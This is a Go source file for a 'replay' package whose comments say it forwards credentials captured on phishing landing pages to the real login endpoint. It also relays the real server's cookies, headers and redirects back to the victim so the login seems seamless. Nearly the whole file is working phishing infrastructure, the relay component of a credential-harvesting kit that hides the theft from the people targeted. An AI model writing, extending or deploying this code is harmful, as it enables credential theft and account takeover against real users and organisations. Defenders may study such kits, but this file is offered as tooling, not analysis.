// Package replay provides credential replay functionality for phishing landing pages.
// After credentials are captured, the replay handler forwards them to the real login URL
// so targets experience seamless login to the actual service.
package replay

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"time"
)

// ReplayConfig holds configuration for credential replay.
type ReplayConfig struct {
	// TargetURL is the real login endpoint to forward credentials to.
	// Example: "https://login.company.com/auth/login"
	TargetURL string

	// Method is the HTTP method to use (default "POST").
	Method string

	// ContentType is the Content-Type for the replayed request.
	// Default: "application/x-www-form-urlencoded"
	// Alternative: "application/json"
	ContentType string

	// TimeoutSeconds is the max time to wait for the real server response.
	// Default: 10
	TimeoutSeconds int

	// FieldMapping maps captured field names to the real form's field names.
	// If empty, field names are passed through unchanged.
	// Example: {"user_email": "username", "user_pass": "password"}
	FieldMapping map[string]string

	// ExtraFields are additional fields to include in the replay request
	// that weren't captured (e.g., CSRF tokens, hidden fields).
	ExtraFields map[string]string

	// RelayHeaders controls which response headers are relayed to the target.
	// Default: relay Set-Cookie, Location, and Content-Type.
	RelayHeaders []string

	// Enabled controls whether replay is active. Default false.
	Enabled bool

	// TLSCert is the certificate to use for TLS verification (optional).
	// Useful for testing with httptest servers.
	TLSCert *tls.Certificate

	// SkipTLSCertVerify controls whether to skip TLS certificate verification.
	// Default: false
	SkipTLSCertVerify bool
}

// ReplayHandler forwards captured credentials to a real login endpoint
// and relays the response back to the target's browser.
type ReplayHandler struct {
	config ReplayConfig
	client *http.Client
}

// ReplayResult contains the real server's response to relay to the target.
type ReplayResult struct {
	// StatusCode is the HTTP status from the real server.
	StatusCode int

	// Headers are response headers to relay (filtered by RelayHeaders config).
	Headers http.Header

	// Cookies are Set-Cookie headers from the real server.
	Cookies []*http.Cookie

	// Body is the response body from the real server.
	Body []byte

	// RedirectURL is the Location header if the response is a redirect.
	RedirectURL string
}

// NewReplayHandler creates a new ReplayHandler with the given configuration.
func NewReplayHandler(config ReplayConfig) *ReplayHandler {
	if config.Method == "" {
		config.Method = http.MethodPost
	}
	if config.ContentType == "" {
		config.ContentType = "application/x-www-form-urlencoded"
	}
	if config.TimeoutSeconds == 0 {
		config.TimeoutSeconds = 10
	}
	if len(config.RelayHeaders) == 0 {
		config.RelayHeaders = []string{
			http.CanonicalHeaderKey("Set-Cookie"),
			http.CanonicalHeaderKey("Location"),
			http.CanonicalHeaderKey("Content-Type"),
		}
	}

	// Create HTTP client with custom redirect policy that doesn't follow redirects.
	client := &http.Client{
		Timeout: time.Duration(config.TimeoutSeconds) * time.Second,
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			TLSClientConfig: &tls.Config{
				MinVersion:         tlsVersion("TLS1.2"),
				InsecureSkipVerify: config.SkipTLSCertVerify,
			},
		},
		// Don't follow redirects - we relay them to the target.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Enable cookie handling for the replay.
	jar, _ := cookiejar.New(nil)
	client.Jar = jar

	// If a CA cert is provided (e.g., for testing), use it.
	if config.TLSCert != nil {
		client.Transport.(*http.Transport).TLSClientConfig.Certificates = append(
			client.Transport.(*http.Transport).TLSClientConfig.Certificates,
			*config.TLSCert,
		)
	}

	return &ReplayHandler{
		config: config,
		client: client,
	}
}

// tlsVersion converts a string like "TLS1.2" to the corresponding tls.Version constant.
func tlsVersion(v string) uint16 {
	switch v {
	case "TLS1.2":
		return 0x0303
	case "TLS1.3":
		return 0x0304
	default:
		return 0x0303 // TLS 1.2 as default
	}
}

// Replay takes captured form fields and forwards them to the real login URL.
// It returns the real server's response which should be relayed to the target.
func (h *ReplayHandler) Replay(ctx context.Context, fields map[string]string) (*ReplayResult, error) {
	// Check if replay is enabled.
	if !h.config.Enabled {
		return &ReplayResult{}, fmt.Errorf("replay: replay is not enabled")
	}

	if h.config.TargetURL == "" {
		return nil, fmt.Errorf("replay: target URL is required")
	}

	// Map field names if FieldMapping is configured.
	mappedFields := make(map[string]string)
	for key, value := range fields {
		if newKey, ok := h.config.FieldMapping[key]; ok {
			mappedFields[newKey] = value
		} else {
			mappedFields[key] = value
		}
	}

	// Merge extra fields.
	for key, value := range h.config.ExtraFields {
		mappedFields[key] = value
	}

	// Build request body based on content type.
	var body io.Reader
	var err error

	switch strings.ToLower(h.config.ContentType) {
	case "application/json", "json":
		body, err = h.buildJSONBody(mappedFields)
	default:
		body, err = h.buildFormBody(mappedFields)
	}

	if err != nil {
		return nil, fmt.Errorf("replay: failed to build request body: %w", err)
	}

	// Create the HTTP request.
	req, err := http.NewRequestWithContext(ctx, h.config.Method, h.config.TargetURL, body)
	if err != nil {
		return nil, fmt.Errorf("replay: failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", h.config.ContentType)

	// Send the request to the real server.
	resp, err := h.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("replay: failed to send request: %w", err)
	}
	defer resp.Body.Close()

	// Read the response body.
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("replay: failed to read response body: %w", err)
	}

	// Extract cookies from the response.
	cookies := h.client.Jar.Cookies(req.URL)
	cookieHeaders := resp.Header.Values("Set-Cookie")
	cookieJarCookies := make([]*http.Cookie, 0, len(cookies)+len(cookieHeaders))
	for _, c := range cookies {
		cookieJarCookies = append(cookieJarCookies, c)
	}

	// Filter response headers based on RelayHeaders config.
	filteredHeaders := make(http.Header)
	for _, headerKey := range h.config.RelayHeaders {
		values := resp.Header[headerKey]
		if values == nil {
			values = resp.Header[http.CanonicalHeaderKey(headerKey)]
		}
		if len(values) > 0 {
			filteredHeaders[headerKey] = values
		}
	}

	// Get redirect URL if response is a redirect.
	redirectURL := resp.Header.Get("Location")

	return &ReplayResult{
		StatusCode:  resp.StatusCode,
		Headers:     filteredHeaders,
		Cookies:     cookieJarCookies,
		Body:        respBody,
		RedirectURL: redirectURL,
	}, nil
}

// buildJSONBody marshals the fields to JSON.
func (h *ReplayHandler) buildJSONBody(fields map[string]string) (io.Reader, error) {
	data, err := json.Marshal(fields)
	if err != nil {
		return nil, err
	}
	return bytes.NewReader(data), nil
}

// buildFormBody encodes the fields as form data.
func (h *ReplayHandler) buildFormBody(fields map[string]string) (io.Reader, error) {
	var sb strings.Builder
	first := true
	for key, value := range fields {
		if !first {
			sb.WriteString("&")
		}
		sb.WriteString(urlQueryEscape(key) + "=" + urlQueryEscape(value))
		first = false
	}
	return strings.NewReader(sb.String()), nil
}

// urlQueryEscape escapes a string for use in a URL query string.
func urlQueryEscape(s string) string {
	var sb strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == ' ':
			sb.WriteByte('+')
		case (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'):
			sb.WriteByte(c)
		case c == '-' || c == '_' || c == '.' || c == '!' || c == '*' || c == '\'' || c == '(' || c == ')' || c == '~':
			sb.WriteByte(c)
		case c == ',' || c == '/' || c == ':' || c == ';' || c == '=' || c == '?' || c == '@' || c == '[' || c == ']':
			sb.WriteByte(c)
		default:
			fmt.Fprintf(&sb, "%%%02X", c)
		}
	}
	return sb.String()
}

// RelayToResponse writes the ReplayResult to an http.ResponseWriter,
// effectively making the target's browser receive the real server's response.
func RelayToResponse(w http.ResponseWriter, result *ReplayResult) {
	// Copy filtered headers (must be set before WriteHeader).
	for key, values := range result.Headers {
		for _, value := range values {
			w.Header().Add(key, value)
		}
	}

	// Set cookies from the result (must be set before WriteHeader).
	for _, cookie := range result.Cookies {
		http.SetCookie(w, cookie)
	}

	// Set the status code.
	w.WriteHeader(result.StatusCode)

	// Write the response body.
	if _, err := w.Write(result.Body); err != nil {
		// Response already started, can't send error.
		_ = err
	}
}
